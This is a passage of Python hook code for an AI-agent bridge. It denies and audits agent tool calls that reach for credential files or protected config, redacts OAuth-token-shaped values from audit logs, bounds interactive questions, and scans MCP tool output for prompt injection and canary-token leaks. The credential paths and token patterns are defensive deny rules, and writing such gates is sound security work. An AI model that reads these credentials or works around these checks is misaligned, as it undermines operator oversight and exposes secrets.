    return {"summary": truncate_text(json.dumps(tool_input, ensure_ascii=False, sort_keys=True), 240)}


def pretool_block_response(reason: str, detail: dict[str, Any]) -> None:
    json.dump(
        {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": reason,
                "additionalContext": reason,
            }
        },
        sys.stdout,
        ensure_ascii=False,
    )
    sys.stdout.write("\n")


def _askuserquestion_enabled() -> bool:
    """Whether the bounded-AskUserQuestion intercept is active.

    Default ON — an autonomous bridge agent that calls AskUserQuestion without
    the bound is the foot-gun #1569 fixes. An operator can set
    ``BRIDGE_ASKUSERQUESTION_BOUND=0`` to restore the raw (unbounded)
    multiple-choice UI for a specific interactive session.
    """
    raw = os.environ.get("BRIDGE_ASKUSERQUESTION_BOUND", "").strip().lower()  # noqa: iso-helper-boundary — os.environ (.environ) false-matches the .env boundary pattern; this is a feature toggle, not an isolated runtime artifact
    return raw not in {"0", "false", "no", "off"}


def handle_askuserquestion(payload: dict[str, Any], agent: str, tool_input: dict[str, Any]) -> int:
    """Bound an AskUserQuestion call to a channel escalation + fallback (#1569).

    PreToolUse cannot inject a tool result, so the contract is: DENY the
    AskUserQuestion call and carry the human's channel answer (or the
    autonomous fallback instruction) back to the agent in
    ``permissionDecisionReason`` / ``additionalContext``. The agent then acts
    on that guidance instead of hanging on the interactive picker.

    The bounded wait + escalation lives in ``askuserquestion_escalate`` so the
    polling loop stays out of the per-tool dispatch path; this wrapper only
    builds the audit row + the deny response. NEVER waits beyond
    ``BRIDGE_ASKUSERQUESTION_WAIT_SECONDS`` (default 30s).
    """
    if _auq_escalate is None:
        # The escalation helper is missing/unimportable. We must STILL bound the
        # call rather than let the raw unbounded picker through (codex #1569 r1
        # finding 1) — deny with the safe reversible fallback so the agent
        # proceeds with a note instead of hanging.
        result = {
            "decision": "proceed_with_note",
            "reason": (
                "AskUserQuestion escalation is unavailable on this install "
                "(helper module not loaded); proceed with your best-judgment "
                "default and leave a durable note. Do NOT retry the question."
            ),
            "waited_seconds": 0,
            "high_stakes": False,
        }
        reason = str(result["reason"])
        write_audit(
            "askuserquestion_bounded",
            agent or "unknown",
            {
                "agent": agent,
                "tool_use_id": str(payload.get("tool_use_id") or ""),
                "session_id": str(payload.get("session_id") or ""),
                "decision": result["decision"],
                "waited_seconds": result["waited_seconds"],
                "high_stakes": result["high_stakes"],
                "escalated": False,
            },
        )
        pretool_block_response(reason, {"agent": agent, "tool_name": "AskUserQuestion"})
        return 0

    try:
        result = _auq_escalate.resolve_escalation(
            tool_input,
            agent=agent,
            state_dir=bridge_home_dir() / "state",
            script_dir=ROOT,
        )
    except Exception as exc:  # noqa: BLE001
        # The escalation machinery failed (bad env, missing script, etc.). The
        # ONE thing we must never do is hang or hard-error — fall back to the
        # safe reversible branch so the agent proceeds with a note rather than
        # stalling on the interactive picker.
        result = {
            "decision": "proceed_with_note",
            "reason": (
                "AskUserQuestion escalation could not run "
                f"({type(exc).__name__}); proceed with your best-judgment "
                "default and leave a durable note. Do NOT retry the question."
            ),
            "waited_seconds": 0,
            "high_stakes": False,
        }

    reason = str(result.get("reason") or "")
    write_audit(
        "askuserquestion_bounded",
        agent or "unknown",
        {
            "agent": agent,
            "tool_use_id": str(payload.get("tool_use_id") or ""),
            "session_id": str(payload.get("session_id") or ""),
            "decision": result.get("decision"),
            "waited_seconds": result.get("waited_seconds"),
            "high_stakes": result.get("high_stakes"),
            "escalated": result.get("escalated"),
        },
    )
    pretool_block_response(reason, {"agent": agent, "tool_name": "AskUserQuestion"})
    return 0


def _system_config_path_from_input(tool_name: str, tool_input: dict[str, Any]) -> Path | None:
    """Return the protected-path argument that triggered the hook deny.

    Read from `file_path` / `path` for non-Bash tools; for Bash, scan the
    shlex-tokenised command for the first token that resolves under the
    protected list. Returns None when no protected path is identifiable —
    in that case the audit row falls back to a path-less detail.
    """
    if tool_name != "Bash":
        for key in ("file_path", "path"):
            raw = str(tool_input.get(key) or "").strip()
            if not raw:
                continue
            try:
                candidate = Path(raw).expanduser()
            except Exception:
                continue
            if is_protected_path(candidate):
                return candidate
        return None
    command = str(tool_input.get("command") or "")
    try:
        tokens = shlex.split(command, posix=True, comments=False)
    except ValueError:
        return None
    for tok in tokens:
        for fragment in _alias_path_fragments(tok):
            expanded = os.path.expandvars(os.path.expanduser(fragment))
            if not expanded:
                continue
            try:
                candidate = Path(expanded)
            except Exception:
                continue
            if is_protected_path(candidate):
                return candidate
    return None


def _path_sha256(path: Path) -> str:
    """sha256 of *path* contents, or empty string if unreadable.

    The hook records the at-rest sha as `before_sha256`. There is
    intentionally no `after_sha256` on hook-deny rows — the change was
    prevented, so there is no "after" state to record (codex r1 #341
    CP3). The wrapper-apply row is the only place `after_sha256` is
    meaningful.
    """
    try:
        import hashlib
        with path.open("rb") as fh:
            return hashlib.sha256(fh.read()).hexdigest()
    except OSError:
        return ""


def _write_system_config_audit_row(
    agent: str,
    tool_name: str,
    tool_input: dict[str, Any],
    target_path: Path | None,
) -> None:
    """Write the issue #341 `system_config_mutation` audit row.

    Shape mirrors the brief: actor, actor_source, trigger, path,
    before_sha256, operation. ``after_sha256`` is intentionally omitted
    on hook-deny — no mutation occurred, so an "after" hash would
    misrepresent the audit chain (codex r1 #341 CP3). Hook-side
    actor_source is always `agent-direct` — the hook fires before any
    caller-source promotion that the wrapper would otherwise apply.

    Codex r1 BLOCKING #1 r3 (#1358, 2026-05-29): if the Bash command
    matched the sanctioned credential-routine shape, substitute the
    raw `operation` (which would otherwise carry the token) with the
    `command_sha256` anchor. Belt-and-suspenders for the rare case
    where a sanctioned-shape command also trips the SYSTEM_CONFIG or
    ROSTER_LOCAL deny — `agent_tool_denied` already gets the same
    scrub upstream, but this audit row is independent.

    Codex r2 BLOCKING (r3, 2026-05-29): the scrub gate is
    :func:`_bash_audit_summary_needs_hashing` (shape-match OR any
    credential marker), NOT :func:`_is_admin_credential_routine`
    (role+shape). An env-roster mismatch caller's sanctioned-shape
    command — or any non-shape Bash command that merely carries a
    credential marker — is denied yet still carries the token; hashing
    on the broader gate keeps the token out of this row regardless of
    whether the carve-out allowed or denied.
    """
    if target_path is None:
        path_str = ""
        before = ""
    else:
        path_str = str(target_path)
        before = _path_sha256(target_path)
    if tool_name == "Bash":
        bash_command = str(tool_input.get("command") or "")
        if _bash_audit_summary_needs_hashing(bash_command):
            operation = (
                f"command_sha256={_credential_routine_command_sha256(bash_command)}"
            )
        else:
            operation = truncate_text(bash_command, 240)
    else:
        # Codex r3 BLOCKING (r4, 2026-05-29, #1358): the non-Bash branch
        # builds `operation` from EVERY raw `tool_input` value — including
        # `content` on an admin Write/Edit to a protected system-config
        # path (agent-roster.local.sh / settings.json). When that content
        # carries an `sk-ant-o…` token, the raw token landed in this
        # INDEPENDENT `system_config_mutation` row even though the
        # `agent_tool_denied` row above was already scrubbed. R1–R3 sealed
        # the Bash writers and the deny/PostToolUse summaries one at a
        # time; this is the fourth writer in the same class. Redact
        # token-shaped VALUES out of each field (value-only — a credential
        # FILE PATH such as `~/.claude/.credentials.json` stays as a
        # forensic anchor, the token bytes do not). The `write_audit`
        # choke-point (#1358 r4, `_redact_audit_detail_credentials`) is the
        # belt-and-suspenders SSOT that catches this for every writer; the
        # explicit redaction here keeps the at-source contract reviewable.
        operation = json.dumps(
            {
                key: _redact_credential_token_values(truncate_text(str(value), 120))
                for key, value in tool_input.items()
                if value
            },
            ensure_ascii=False,
            sort_keys=True,
        )
    detail = {
        "kind": "system_config_mutation",
        "actor": agent or "unknown",
        "actor_source": "agent-direct",
        "trigger": "hook-deny",
        "path": path_str,
        "before_sha256": before,
        "operation": truncate_text(operation, 240),
        "tool_name": tool_name,
        "matched_pattern": matched_pattern(target_path) or "" if target_path else "",
    }
    write_audit("system_config_mutation", agent or "unknown", detail)


def handle_pretool(payload: dict[str, Any], agent: str) -> int:
    tool_name = str(payload.get("tool_name") or "")
    tool_input = payload.get("tool_input") or {}
    if not isinstance(tool_input, dict):
        return 0

    # Issue #1569: bound AskUserQuestion to a channel escalation + autonomous
    # fallback so an autonomous agent never hangs on the interactive picker.
    # This is a fully separate, short-circuiting branch — it returns before any
    # other gate runs, so the credential / protected-path / cross-agent
    # handling of EVERY OTHER tool stays byte-for-byte unchanged. The intercept
    # fires whenever the bound is enabled (default on); a missing/broken helper
    # does NOT fall through to the raw unbounded tool (codex #1569 r1 finding 1)
    # — handle_askuserquestion takes the safe proceed-with-note fallback so the
    # call is always bounded.
    if tool_name == "AskUserQuestion" and _askuserquestion_enabled():
        return handle_askuserquestion(payload, agent, tool_input)

    reason: str | None = None
    detail = {
        "agent": agent,
        "tool_name": tool_name,
        "tool_use_id": str(payload.get("tool_use_id") or ""),
        "session_id": str(payload.get("session_id") or ""),
        "summary": tool_input_summary(tool_name, tool_input),
    }
    target_agent = detect_target_agent(tool_name, tool_input, agent)
    if target_agent:
        detail["target_agent"] = target_agent

    if tool_name == "Bash":
        reason = protected_alias_reason(
            str(tool_input.get("command") or ""),
            agent,
            tool_input=tool_input,
        )
    else:
        # Classify read-intent once for the whole non-Bash branch — both
        # the credential carve-out below and the protected-path gate
        # that follows need the same classification. Read / Glob / Grep
        # / NotebookRead are read-intent; Edit / Write / MultiEdit /
        # NotebookEdit and unknown tools are write-intent.
        read_intent = _is_read_intent_tool(tool_name, tool_input)
        admin = is_admin_agent(agent)
        for key in ("file_path", "path", "pattern"):
            raw = str(tool_input.get(key) or "").strip()
            if not raw:
                continue
            if _raw_mentions_claude_credentials(raw):
                # Admin + read-intent (Read / Glob / Grep /
                # NotebookRead) diagnostic on a credential surface —
                # allow with an audit row. Mutating tools (Edit / Write
                # / NotebookEdit) and non-admin agents stay denied.
                if admin and read_intent:
                    _emit_admin_credential_read_allowed(
                        agent,
                        tool=tool_name,
                        surface="input_path",
                        sample=raw,
                        tool_input=tool_input,
                    )
                    continue
                reason = CLAUDE_CREDENTIAL_DENY_REASON
                break
            if key in ("file_path", "path"):
                try:
                    candidate = Path(raw).expanduser()
                except Exception:
                    continue
                credential_reason = claude_credentials_reason_for_path(candidate)
                if credential_reason:
                    # Same carve-out logic for the path-typed credential
                    # check: admin diagnostic Read of `.credentials.json`
                    # (or any path resolved by `claude_credential_paths`)
                    # is allowed and audited; mutations stay denied.
                    if admin and read_intent:
                        _emit_admin_credential_read_allowed(
                            agent,
                            tool=tool_name,
                            surface="input_path",
                            sample=str(candidate),
                            tool_input=tool_input,
                        )
                        continue
                    reason = credential_reason
                    break

        if reason is None:
            # Issue #383: Read / Glob / Grep / NotebookRead tools get the
            # read-intent allowance on protected paths. Edit / Write /
            # NotebookEdit and unknown tools stay write-intent.
            # `read_intent` was already classified above for the
            # credential carve-out — reuse it.
            for key in ("file_path", "path"):
                raw = str(tool_input.get(key) or "").strip()
                if not raw:
                    continue
                try:
                    candidate = Path(raw).expanduser()
                except Exception:
                    continue
                reason = protected_path_reason(candidate, agent, read_intent=read_intent)
                if reason:
                    break

    if reason:
        detail["reason"] = reason
        # Codex r1 BLOCKING #1 r3 (2026-05-29): if the Bash command was
        # a sanctioned credential routine, the exemption row above was
        # hash-only, but a downstream deny (e.g. `--token-file
        # ~/.claude/.credentials.json` tripping the credential-path
        # argv gate) would otherwise write the raw command into
        # `detail.summary.command` via :func:`tool_input_summary`.
        # Substitute the hash-only summary so the audit log NEVER
        # persists the OAuth token, regardless of which deny gate the
        # carve-out shape ultimately tripped.
        #
        # Codex r2 BLOCKING (r3, 2026-05-29): the scrub gate is
        # :func:`_bash_audit_summary_needs_hashing` (sanctioned shape OR
        # any credential marker), NOT :func:`_is_admin_credential_routine`
        # (role+shape). Two leaks this closes:
        #   1. env-roster MISMATCH: `BRIDGE_ADMIN_AGENT_ID` set but the
        #      agent's SESSION-TYPE.md is not `admin`. The carve-out
        #      correctly DENIES via the substring guard, but the deny
        #      row's scrub was gated on the role+shape predicate — so it
        #      did NOT fire and the raw token landed in summary.command.
        #   2. NON-shape credential mention: a bare `echo sk-ant-o-…`
        #      (or any command naming a credential marker) is denied by
        #      `_raw_mentions_claude_credentials` but is not the
        #      sanctioned routine shape, so the shape-only scrub missed
        #      it and the raw token leaked into the deny row.
        # Hashing on the broader gate keeps the token out of the audit
        # log for any credential-bearing Bash command. Non-credential
        # commands keep their forensic `command` detail.
        #
        # Codex r2 BLOCKING (r3, 2026-05-29): non-Bash tools (Grep
        # `pattern`, Read/Write `file_path`, etc.) can also carry a
        # token-shaped VALUE that `tool_input_summary` would otherwise
        # persist raw (e.g. `Grep pattern=sk-ant-o-…`). The Bash branch
        # hashes the whole command; the non-Bash branch instead redacts
        # only the token-shaped VALUES so a credential FILE PATH stays
        # as a forensic anchor while the token bytes never survive.
        if tool_name == "Bash":
            bash_command = str(tool_input.get("command") or "")
            if _bash_audit_summary_needs_hashing(bash_command):
                detail["summary"] = _credential_routine_hash_only_summary(
                    bash_command
                )
        elif isinstance(detail.get("summary"), dict):
            detail["summary"] = _redact_credential_summary(detail["summary"])
        write_audit("agent_tool_denied", agent or "unknown", detail)
        # Both the generic system-config deny and the more-specific
        # roster-local deny (codex r1 #341 CP2) are protected-path
        # mutations and need a `system_config_mutation` audit row so
        # the operator can attribute the attempt.
        if reason in (SYSTEM_CONFIG_DENY_REASON, ROSTER_LOCAL_DENY_REASON):
            _write_system_config_audit_row(
                agent,
                tool_name,
                tool_input,
                _system_config_path_from_input(tool_name, tool_input),
            )
        pretool_block_response(reason, detail)
        return 0
    return 0


def handle_posttool_common(payload: dict[str, Any], agent: str, action: str) -> None:
    tool_name = str(payload.get("tool_name") or "")
    tool_input = payload.get("tool_input") or {}
    if not isinstance(tool_input, dict):
        tool_input = {}
    detail = {
        "agent": agent,
        "tool_name": tool_name,
        "tool_use_id": str(payload.get("tool_use_id") or ""),
        "session_id": str(payload.get("session_id") or ""),
        "cwd": str(payload.get("cwd") or current_agent_workdir()),
        "summary": tool_input_summary(tool_name, tool_input),
    }
    # Codex r2 BLOCKING #1 r4 (#1358, 2026-05-29): when the Bash command
    # was a sanctioned credential routine, both `agent_tool_use`
    # (PostToolUse success) and `agent_tool_failure` (PostToolUseFailure)
    # would otherwise persist the raw command — including the
    # here-string / heredoc token body — in `detail.summary.command` via
    # :func:`tool_input_summary`. R2 / R3 sealed the PreToolUse exemption
    # and downstream-deny paths; the PostToolUse audit row is the last
    # writer that touches the same `tool_input["command"]` text. Apply
    # the same hash-only substitution here so the OAuth token never
    # lands in the audit log regardless of which hook event captured it.
    #
    # Codex r2 BLOCKING (r3, 2026-05-29): the scrub gate is
    # :func:`_bash_audit_summary_needs_hashing` (sanctioned shape OR any
    # credential marker), NOT :func:`_is_admin_credential_routine`
    # (role+shape). A PostToolUse row can fire for an env-roster-mismatch
    # caller whose sanctioned-shape command was NOT exempted (PreToolUse
    # denied), or for any non-shape Bash command that merely names a
    # credential marker, with the token still riding in
    # `tool_input["command"]`; hashing on the broader gate keeps the
    # token out of this row too. Non-credential Bash commands keep their
    # existing forensic detail.
    # Non-Bash tools (Grep `pattern`, Read/Write `file_path`, etc.) can
    # carry token-shaped VALUES too — redact those out of the PostToolUse
    # summary the same way the deny path does (codex r2 BLOCKING r3).
    if tool_name == "Bash":
        bash_command = str(tool_input.get("command") or "")
        if _bash_audit_summary_needs_hashing(bash_command):
            detail["summary"] = _credential_routine_hash_only_summary(
                bash_command
            )
    elif isinstance(detail.get("summary"), dict):
        detail["summary"] = _redact_credential_summary(detail["summary"])
    target_agent = detect_target_agent(tool_name, tool_input, agent)
    if target_agent:
        detail["target_agent"] = target_agent
    if action == "agent_tool_failure":
        detail["error"] = truncate_text(str(payload.get("error") or ""), 240)
        detail["is_interrupt"] = bool(payload.get("is_interrupt"))
    write_audit(action, agent or "unknown", detail)


def handle_posttool(payload: dict[str, Any], agent: str) -> int:
    handle_posttool_common(payload, agent, "agent_tool_use")
    tool_name = str(payload.get("tool_name") or "")
    if is_builtin_tool(tool_name):
        return 0
    if not prompt_guard_enabled():
        return 0

    threshold = threshold_for_surface("mcp_output", "high")
    text = tool_output_text(tool_name, payload.get("tool_response"))
    scan = analyze_text(text, threshold=threshold, surface="mcp_output", agent=agent)
    if scan.blocked:
        write_audit(
            "prompt_guard_blocked",
            agent or "unknown",
            {
                "surface": "mcp_output",
                "tool_name": tool_name,
                "severity": scan.severity,
                "threshold": scan.threshold,
                "reasons": scan.reasons[:5],
            },
        )
        json.dump(
            {
                "decision": "block",
                "reason": f"Prompt guard blocked MCP output ({scan.severity}): {', '.join(scan.reasons[:3]) or 'policy match'}",
                "hookSpecificOutput": {
                    "hookEventName": "PostToolUse",
                    "additionalContext": "The MCP tool output was blocked before entering Claude context.",
                },
            },
            sys.stdout,
            ensure_ascii=False,
        )
        sys.stdout.write("\n")
        return 0

    sanitize = sanitize_text(text, surface="mcp_output", agent=agent)
    if sanitize.blocked:
        write_audit(
            "prompt_guard_canary_triggered",
            agent or "unknown",
            {
                "surface": "mcp_output",
                "tool_name": tool_name,
                "canary_tokens": sanitize.canary_tokens,
            },
        )
        json.dump(
            {
                "decision": "block",
                "reason": "Prompt guard blocked MCP output due to canary token leakage.",
            },
            sys.stdout,
            ensure_ascii=False,
        )
        sys.stdout.write("\n")
        return 0

    if sanitize.was_modified and isinstance(payload.get("tool_response"), str):
        write_audit(
            "prompt_guard_sanitized",
            agent or "unknown",
            {
                "surface": "mcp_output",
                "tool_name": tool_name,
                "redacted_types": sanitize.redacted_types,
                "redaction_count": sanitize.redaction_count,
            },
        )
        json.dump(
            {
                "hookSpecificOutput": {
                    "hookEventName": "PostToolUse",
                    "additionalContext": "Prompt guard sanitized sensitive MCP output before it entered context.",
                    "updatedMCPToolOutput": sanitize.sanitized_text,
                }
            },
            sys.stdout,
            ensure_ascii=False,
        )
        sys.stdout.write("\n")
    return 0


def handle_posttool_failure(payload: dict[str, Any], agent: str) -> int:
    handle_posttool_common(payload, agent, "agent_tool_failure")
    return 0


def main() -> int:
    try:
        payload = json.load(sys.stdin)
    except Exception:
        return 0

    agent = current_agent()
    event = str(payload.get("hook_event_name") or "")
    if not agent or not event:
        return 0

    if event == "PreToolUse":
        return handle_pretool(payload, agent)
    if event == "PostToolUse":
        return handle_posttool(payload, agent)
    if event == "PostToolUseFailure":
        return handle_posttool_failure(payload, agent)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
